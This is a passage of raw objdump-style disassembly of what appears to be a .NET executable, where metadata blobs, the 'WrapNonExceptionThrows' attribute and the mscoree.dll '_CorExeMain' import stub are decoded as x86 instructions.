  409cee:	20 01                	and    %al,(%ecx)
  409cf0:	01 11                	add    %edx,(%ecx)
  409cf2:	81 4d 05 20 00 11 81 	orl    $0x81110020,0x5(%ebp)
  409cf9:	4d                   	dec    %ebp
  409cfa:	04 00                	add    $0x0,%al
  409cfc:	00 11                	add    %dl,(%ecx)
  409cfe:	65 05 00 01 11 65    	gs add $0x65110100,%eax
  409d04:	0e                   	push   %cs
  409d05:	04 07                	add    $0x7,%al
  409d07:	01 11                	add    %edx,(%ecx)
  409d09:	2d 05 20 01 01       	sub    $0x1012005,%eax
  409d0e:	11 65 06             	adc    %esp,0x6(%ebp)
  409d11:	20 01                	and    %al,(%ecx)
  409d13:	01 12                	add    %edx,(%edx)
  409d15:	81 59 06 15 12 61 01 	sbbl   $0x1611215,0x6(%ecx)
  409d1c:	11 34 05 20 01 13 00 	adc    %esi,0x130120(,%eax,1)
  409d23:	08 05 20 00 12 81    	or     %al,0x81120020
  409d29:	5d                   	pop    %ebp
  409d2a:	09 20                	or     %esp,(%eax)
  409d2c:	02 01                	add    (%ecx),%al
  409d2e:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  409d34:	06                   	push   %es
  409d35:	20 01                	and    %al,(%ecx)
  409d37:	01 12                	add    %edx,(%edx)
  409d39:	81 5d 06 20 01 01 11 	sbbl   $0x11010120,0x6(%ebp)
  409d40:	81 65 05 20 00 11 81 	andl   $0x81110020,0x5(%ebp)
  409d47:	69 05 20 01 01 13 00 	imul   $0x2200600,0x13010120,%eax
  409d4e:	06 20 02 
  409d51:	01 08                	add    %ecx,(%eax)
  409d53:	13 00                	adc    (%eax),%eax
  409d55:	06                   	push   %es
  409d56:	20 03                	and    %al,(%ebx)
  409d58:	01 08                	add    %ecx,(%eax)
  409d5a:	08 08                	or     %cl,(%eax)
  409d5c:	03 20                	add    (%eax),%esp
  409d5e:	00 0d 07 00 04 0e    	add    %cl,0xe040007
  409d64:	0e                   	push   %cs
  409d65:	1c 1c                	sbb    $0x1c,%al
  409d67:	1c 05                	sbb    $0x5,%al
  409d69:	00 02                	add    %al,(%edx)
  409d6b:	0e                   	push   %cs
  409d6c:	0e                   	push   %cs
  409d6d:	0e                   	push   %cs
  409d6e:	03 00                	add    (%eax),%eax
  409d70:	00 01                	add    %al,(%ecx)
  409d72:	2d 07 14 08 08       	sub    $0x8081407,%eax
  409d77:	08 11                	or     %dl,(%ecx)
  409d79:	34 08                	xor    $0x8,%al
  409d7b:	08 08                	or     %cl,(%eax)
  409d7d:	08 08                	or     %cl,(%eax)
  409d7f:	11 81 71 11 81 0d    	adc    %eax,0xd811171(%ecx)
  409d85:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409d8b:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409d91:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409d97:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409d9d:	11 81 0d 05 07 02    	adc    %eax,0x207050d(%ecx)
  409da3:	19 11                	sbb    %edx,(%ecx)
  409da5:	3c 06                	cmp    $0x6,%al
  409da7:	00 02                	add    %al,(%edx)
  409da9:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409dac:	0e                   	push   %cs
  409dad:	07                   	pop    %es
  409dae:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409db3:	12 7d 07             	adc    0x7(%ebp),%bh
  409db6:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409dbb:	80 81 08 15 12 81 39 	addb   $0x39,-0x7eedeaf8(%ecx)
  409dc2:	01 12                	add    %edx,(%edx)
  409dc4:	80 81 08 00 01 12 81 	addb   $0x81,0x12010008(%ecx)
  409dcb:	81 11 81 85 06 00    	adcl   $0x68581,(%ecx)
  409dd1:	01 12                	add    %edx,(%edx)
  409dd3:	81 81 0e 05 20 00 12 	addl   $0x6818112,0x20050e(%ecx)
  409dda:	81 81 06 
  409ddd:	00 03                	add    %al,(%ebx)
  409ddf:	0e                   	push   %cs
  409de0:	0e                   	push   %cs
  409de1:	0e                   	push   %cs
  409de2:	0e                   	push   %cs
  409de3:	09 20                	or     %esp,(%eax)
  409de5:	01 12                	add    %edx,(%edx)
  409de7:	81 81 1d 12 81 81 05 	addl   $0x121d0605,-0x7e7eede3(%ecx)
  409dee:	06 1d 12 
  409df1:	81 81 13 20 04 12 81 	addl   $0x81118d81,0x12042013(%ecx)
  409df8:	8d 11 81 
  409dfb:	91                   	xchg   %eax,%ecx
  409dfc:	12 81 95 1d 12 81    	adc    -0x7eede26b(%ecx),%al
  409e02:	81 1d 11 81 99 05 20 	sbbl   $0x1d1c0120,0x5998111
  409e09:	01 1c 1d 
  409e0c:	1c 06                	sbb    $0x6,%al
  409e0e:	00 03                	add    %al,(%ebx)
  409e10:	0e                   	push   %cs
  409e11:	0e                   	push   %cs
  409e12:	1c 1c                	sbb    $0x1c,%al
  409e14:	07                   	pop    %es
  409e15:	00 02                	add    %al,(%edx)
  409e17:	1c 1c                	sbb    $0x1c,%al
  409e19:	12 81 81 0d 20 05    	adc    0x5200d81(%ecx),%al
  409e1f:	1c 0e                	sbb    $0xe,%al
  409e21:	11 81 91 12 81 95    	adc    %eax,-0x6a7eed6f(%ecx)
  409e27:	1c 1d                	sbb    $0x1d,%al
  409e29:	1c 04                	sbb    $0x4,%al
  409e2b:	20 01                	and    %al,(%ecx)
  409e2d:	01 1c 07             	add    %ebx,(%edi,%eax,1)
  409e30:	20 02                	and    %al,(%edx)
  409e32:	01 13                	add    %edx,(%ebx)
  409e34:	00 13                	add    %dl,(%ebx)
  409e36:	01 09                	add    %ecx,(%ecx)
  409e38:	00 02                	add    %al,(%edx)
  409e3a:	02 12                	add    (%edx),%dl
  409e3c:	81 81 12 81 81 05 00 	addl   $0xe0e0200,0x5818112(%ecx)
  409e43:	02 0e 0e 
  409e46:	1c 05                	sbb    $0x5,%al
  409e48:	00 02                	add    %al,(%edx)
  409e4a:	02 0e                	add    (%esi),%cl
  409e4c:	0e                   	push   %cs
  409e4d:	3e 07                	ds pop %es
  409e4f:	17                   	pop    %ss
  409e50:	0e                   	push   %cs
  409e51:	0e                   	push   %cs
  409e52:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409e57:	12 7d 12             	adc    0x12(%ebp),%bh
  409e5a:	80 81 12 81 81 12 81 	addb   $0x81,0x12818112(%ecx)
  409e61:	81 12 81 81 12 81    	adcl   $0x81128181,(%edx)
  409e67:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  409e6a:	0e                   	push   %cs
  409e6b:	1c 12                	sbb    $0x12,%al
  409e6d:	81 a5 12 81 a1 1c 0e 	andl   $0x8580120e,0x1ca18112(%ebp)
  409e74:	12 80 85 
  409e77:	12 80 89 12 81 a5    	adc    -0x5a7eed77(%eax),%al
  409e7d:	15 12 81 39 01       	adc    $0x1398112,%eax
  409e82:	12 80 81 03 1d 12    	adc    0x121d0381(%eax),%al
  409e88:	81 81 1d 1c 03 07 01 	addl   $0x20040801,0x7031c1d(%ecx)
  409e8f:	08 04 20 
  409e92:	00 1d 03 07 20 02    	add    %bl,0x2200703
  409e98:	01 0e                	add    %ecx,(%esi)
  409e9a:	12 80 89 0b 07 05    	adc    0x5070b89(%eax),%al
  409ea0:	12 18                	adc    (%eax),%bl
  409ea2:	12 80 89 03 1d 03    	adc    0x31d0389(%eax),%al
  409ea8:	08 03                	or     %al,(%ebx)
  409eaa:	07                   	pop    %es
  409eab:	01 0e                	add    %ecx,(%esi)
  409ead:	06                   	push   %es
  409eae:	00 01                	add    %al,(%ecx)
  409eb0:	11 81 ad 02 05 20    	adc    %eax,0x200502ad(%ecx)
  409eb6:	00 11                	add    %dl,(%ecx)
  409eb8:	81 b1 04 00 01 01 0e 	xorl   $0x20030e,0x1010004(%ecx)
  409ebf:	03 20 00 
  409ec2:	03 08                	add    (%eax),%ecx
  409ec4:	07                   	pop    %es
  409ec5:	02 12                	add    (%edx),%dl
  409ec7:	80 89 11 81 ad 09 07 	orb    $0x7,0x9ad8111(%ecx)
  409ece:	05 12 80 89 0e       	add    $0xe898012,%eax
  409ed3:	03 0e                	add    (%esi),%ecx
  409ed5:	08 05 00 00 12 81    	or     %al,0x81120000
  409edb:	b5 05                	mov    $0x5,%ch
  409edd:	00 00                	add    %al,(%eax)
  409edf:	11 80 91 05 00 01    	adc    %eax,0x1000591(%eax)
  409ee5:	12 7d 1c             	adc    0x1c(%ebp),%bh
  409ee8:	04 07                	add    $0x7,%al
  409eea:	01 12                	add    %edx,(%edx)
  409eec:	7d 04                	jge    0x409ef2
  409eee:	06                   	push   %es
  409eef:	12 81 c1 07 20 02    	adc    0x22007c1(%ecx),%al
  409ef5:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409ef8:	81 c5 06 20 01 01    	add    $0x1012006,%ebp
  409efe:	12 81 c9 08 15 12    	adc    0x121508c9(%ecx),%al
  409f04:	81 cd 01 12 81 d1    	or     $0xd1811201,%ebp
  409f0a:	05 20 00 12 81       	add    $0x81120020,%eax
  409f0f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  409f10:	07                   	pop    %es
  409f11:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  409f16:	12 7d 06             	adc    0x6(%ebp),%bh
  409f19:	20 01                	and    %al,(%ecx)
  409f1b:	01 12                	add    %edx,(%edx)
  409f1d:	81 d9 07 00 01 12    	sbb    $0x12010007,%ecx
  409f23:	81 e1 12 1d 06 20    	and    $0x20061d12,%ecx
  409f29:	01 01                	add    %eax,(%ecx)
  409f2b:	11 81 e5 05 00 00    	adc    %eax,0x5e5(%ecx)
  409f31:	12 81 e9 06 20 01    	adc    0x12006e9(%ecx),%al
  409f37:	01 12                	add    %edx,(%edx)
  409f39:	81 e1 05 20 00 12    	and    $0x12002005,%ecx
  409f3f:	81 ed 0a 20 00 15    	sub    $0x1500200a,%ebp
  409f45:	12 81 cd 01 12 81    	adc    -0x7eedfe33(%ecx),%al
  409f4b:	d1 08                	rorl   $1,(%eax)
  409f4d:	15 12 81 f1 01       	adc    $0x1f18112,%eax
  409f52:	12 81 c5 0b 20 01    	adc    0x1200bc5(%ecx),%al
  409f58:	01 15 12 81 f1 01    	add    %edx,0x1f18112
  409f5e:	12 81 c5 06 15 12    	adc    0x121506c5(%ecx),%al
  409f64:	81 cd 01 0e 03 00    	or     $0x30e01,%ebp
  409f6a:	00 0e                	add    %cl,(%esi)
  409f6c:	06                   	push   %es
  409f6d:	00 03                	add    %al,(%ebx)
  409f6f:	08 0e                	or     %cl,(%esi)
  409f71:	0e                   	push   %cs
  409f72:	02 07                	add    (%edi),%al
  409f74:	20 02                	and    %al,(%edx)
  409f76:	02 0e                	add    (%esi),%cl
  409f78:	11 81 f5 0a 20 03    	adc    %eax,0x3200af5(%ecx)
  409f7e:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  409f83:	11 81 f9 0c 00 04    	adc    %eax,0x4000cf9(%ecx)
  409f89:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409f8c:	0e                   	push   %cs
  409f8d:	11 81 fd 11 82 01    	adc    %eax,0x18211fd(%ecx)
  409f93:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  409f98:	03 06                	add    (%esi),%eax
  409f9a:	20 01                	and    %al,(%ecx)
  409f9c:	12 82 09 0e 05 00    	adc    0x50e09(%edx),%al
  409fa2:	00 12                	add    %dl,(%edx)
  409fa4:	82 0d 09 20 02 01 12 	orb    $0x12,0x1022009
  409fab:	82 09 12             	orb    $0x12,(%ecx)
  409fae:	82 0d 05 00 02 01 0e 	orb    $0xe,0x1020005
  409fb5:	0e                   	push   %cs
  409fb6:	06                   	push   %es
  409fb7:	20 01                	and    %al,(%ecx)
  409fb9:	12 81 e9 0e 06 20    	adc    0x20060ee9(%ecx),%al
  409fbf:	01 12                	add    %edx,(%edx)
  409fc1:	82 21 0e             	andb   $0xe,(%ecx)
  409fc4:	05 20 00 12 82       	add    $0x82120020,%eax
  409fc9:	29 06                	sub    %eax,(%esi)
  409fcb:	00 02                	add    %al,(%edx)
  409fcd:	02 0e                	add    (%esi),%cl
  409fcf:	10 0d 06 20 01 12    	adc    %cl,0x12012006
  409fd5:	82 25 08 07 20 02 12 	andb   $0x12,0x2200708
  409fdc:	81 e9 0e 1c 06 20    	sub    $0x20061c0e,%ecx
  409fe2:	01 12                	add    %edx,(%edx)
  409fe4:	81 e9 1c 1b 30 02    	sub    $0x2301b1c,%ecx
  409fea:	05 12 81 c9 15       	add    $0x15c98112,%eax
  409fef:	12 81 cd 01 1e 00    	adc    0x1e01cd(%ecx),%al
  409ff5:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  409ffa:	1e                   	push   %ds
  409ffb:	01 12                	add    %edx,(%edx)
  409ffd:	82 3d 12 82 39 1c 05 	cmpb   $0x5,0x1c398212
  40a004:	0a 02                	or     (%edx),%al
  40a006:	0e                   	push   %cs
  40a007:	12 7d 04             	adc    0x4(%ebp),%bh
  40a00a:	20 01                	and    %al,(%ecx)
  40a00c:	02 08                	add    (%eax),%cl
  40a00e:	05 20 00 12 82       	add    $0x82120020,%eax
  40a013:	45                   	inc    %ebp
  40a014:	05 20 00 11 82       	add    $0x82110020,%eax
  40a019:	49                   	dec    %ecx
  40a01a:	51                   	push   %ecx
  40a01b:	07                   	pop    %es
  40a01c:	1f                   	pop    %ds
  40a01d:	12 54 02 0e          	adc    0xe(%edx,%eax,1),%dl
  40a021:	12 48 12             	adc    0x12(%eax),%cl
  40a024:	81 e1 12 81 e9 15    	and    $0x15e98112,%ecx
  40a02a:	12 81 cd 01 0e 0e    	adc    0xe0e01cd(%ecx),%al
  40a030:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  40a035:	12 7d 08             	adc    0x8(%ebp),%bh
  40a038:	08 0e                	or     %cl,(%esi)
  40a03a:	1d 0e 12 81 25       	sbb    $0x2581120e,%eax
  40a03f:	12 82 09 12 82 11    	adc    0x11821209(%edx),%al
  40a045:	0e                   	push   %cs
  40a046:	0e                   	push   %cs
  40a047:	12 82 1d 08 12 82    	adc    -0x7dedf7e3(%edx),%al
  40a04d:	21 0d 15 12 81 f1    	and    %ecx,0xf1811215
  40a053:	01 12                	add    %edx,(%edx)
  40a055:	81 c5 15 12 81 f1    	add    $0xf1811215,%ebp
  40a05b:	01 12                	add    %edx,(%edx)
  40a05d:	81 c5 12 82 39 12    	add    $0x12398212,%ebp
  40a063:	58                   	pop    %eax
  40a064:	08 1d 0e 08 1d 0e    	or     %bl,0xe1d080e
  40a06a:	1d 03 05 01 00       	sbb    $0x10503,%eax
  40a06f:	00 00                	add    %al,(%eax)
  40a071:	00 08                	add    %cl,(%eax)
  40a073:	01 00                	add    %eax,(%eax)
  40a075:	08 00                	or     %al,(%eax)
  40a077:	00 00                	add    %al,(%eax)
  40a079:	00 00                	add    %al,(%eax)
  40a07b:	1e                   	push   %ds
  40a07c:	01 00                	add    %eax,(%eax)
  40a07e:	01 00                	add    %eax,(%eax)
  40a080:	54                   	push   %esp
  40a081:	02 16                	add    (%esi),%dl
  40a083:	57                   	push   %edi
  40a084:	72 61                	jb     0x40a0e7
  40a086:	70 4e                	jo     0x40a0d6
  40a088:	6f                   	outsl  %ds:(%esi),(%dx)
  40a089:	6e                   	outsb  %ds:(%esi),(%dx)
  40a08a:	45                   	inc    %ebp
  40a08b:	78 63                	js     0x40a0f0
  40a08d:	65 70 74             	gs jo  0x40a104
  40a090:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40a097:	77 73                	ja     0x40a10c
  40a099:	01 00                	add    %eax,(%eax)
  40a09b:	00 c4                	add    %al,%ah
  40a09d:	a0 00 00 00 00       	mov    0x0,%al
  40a0a2:	00 00                	add    %al,(%eax)
  40a0a4:	00 00                	add    %al,(%eax)
  40a0a6:	00 00                	add    %al,(%eax)
  40a0a8:	de a0 00 00 00 20    	fisubs 0x20000000(%eax)
	...
  40a0c2:	00 00                	add    %al,(%eax)
  40a0c4:	d0 a0 00 00 00 00    	shlb   $1,0x0(%eax)
	...
  40a0d2:	5f                   	pop    %edi
  40a0d3:	43                   	inc    %ebx
  40a0d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0d5:	72 45                	jb     0x40a11c
  40a0d7:	78 65                	js     0x40a13e
  40a0d9:	4d                   	dec    %ebp
  40a0da:	61                   	popa
  40a0db:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40a0e2:	72 65                	jb     0x40a149
  40a0e4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40a0e8:	6c                   	insb   (%dx),%es:(%edi)
  40a0e9:	00 00                	add    %al,(%eax)
  40a0eb:	00 00                	add    %al,(%eax)
  40a0ed:	00 ff                	add    %bh,%bh
  40a0ef:	25 00 20 40 00       	and    $0x402000,%eax
